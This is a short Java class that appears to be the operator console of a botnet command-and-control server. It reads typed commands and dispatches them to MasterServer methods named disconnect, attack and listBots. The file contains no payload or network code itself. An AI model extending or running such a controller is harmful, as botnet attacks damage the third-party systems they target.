package server;

import java.util.Scanner;

public class ThreadForCommands extends Thread{
	
	MasterServer master=new MasterServer();
	
	public void run(){
		Scanner input = new Scanner(System.in);		
		System.out.println("Input your command master");

		while (input.hasNextLine()) {
			String command=input.nextLine();
			
			if(command.contains("disconnect")){
				master.disconnect(command);
			}else if(command.contains("connect")){
				master.attack(command);
			}else if(command.contains("list")){
				master.listBots();
			}
		}
	}

}
